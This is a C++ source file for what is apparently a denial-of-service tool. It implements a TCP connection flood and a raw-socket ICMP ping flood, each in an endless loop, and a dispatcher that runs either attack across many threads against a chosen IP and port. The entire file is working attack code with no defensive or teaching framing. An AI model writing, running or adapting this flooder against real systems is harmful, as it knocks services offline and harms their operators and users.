#include <netinet/ip_icmp.h>
#include <netdb.h>
#include <cstring>
#include <iostream>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <vector>
#include <thread>
#include <sys/time.h>
#include <string>
#include <mutex>
#include <sstream>
#include <sys/types.h>
#include <sys/select.h>

#include "DOS.h"
#include "net_utils/checksum.h"

void DOS::tcp_flood(const struct targetHost *target_host)
{
    const char *ip = target_host->ip;
    const int port = target_host->port;

    struct sockaddr_in host_addr {};
    host_addr.sin_family = AF_INET;
    host_addr.sin_port = htons(port);
    inet_pton(AF_INET, ip, &host_addr.sin_addr);

    while (true)
    {
        if (const int sock = socket(AF_INET, SOCK_STREAM, 0); sock > 0)
        {
            connect(sock, reinterpret_cast<struct sockaddr*>(&host_addr), sizeof(host_addr));
            close(sock);
        }

    }

}

void DOS::ping_flood(const struct targetHost *target_host)
{
    const char *ip = target_host->ip;
    const size_t _size = target_host->size;

    struct sockaddr_in dest_addr{};
    dest_addr.sin_family = AF_INET;
    inet_pton(AF_INET, ip, &dest_addr.sin_addr);

    const size_t buffer_size = (sizeof(struct icmphdr)+_size);
    char * packet = new char[buffer_size]{};
    memset(packet, 'X', buffer_size);

    struct icmphdr *icmp = reinterpret_cast<struct ::icmphdr*>(packet);
    icmp->type = ICMP_ECHO;
    icmp->un.echo.id = htons(1234);
    icmp->un.echo.sequence = htons(1);
    icmp->checksum = 0;
    icmp->checksum = net_utils::icmp_checksum(icmp, buffer_size);

    if (const int sock = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP); sock < 0) return;

    while (true)
    {
        const int sock = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
        sendto(sock, packet, buffer_size, 0,
            reinterpret_cast<struct sockaddr*>(&dest_addr),sizeof(dest_addr));

        close(sock);
    }

    delete [] packet;
}

int DOS::dOS(const int th, const int type, const struct targetHost *target_host) {
    switch (type) {
        case 1: {

            std::vector<std::thread> threads;
            threads.reserve(th);

            for (int i = 0; i < th; i++) {
                threads.emplace_back([target_host]() {

                    DOS::tcp_flood(target_host);
                });
            }
            for (auto& thread : threads) {if (thread.joinable()) thread.join();}
            break;
        }
        case 2: {

            std::vector<std::thread> threads;
            threads.reserve(th);

            if (target_host->size > 65507) {
                fprintf(stderr, "Error: Packet size exceeds maximum allowed size for ICMP packets (65507 bytes).\n");
                return 0;
            }

            for (int i = 0; i < th; i++) {
                threads.emplace_back([target_host]() {

                    DOS::ping_flood(target_host);
                });
            }
            for (auto& thread : threads) {if (thread.joinable()) thread.join();}
            break;
        }
        default: {

            break;
        }
    }

}
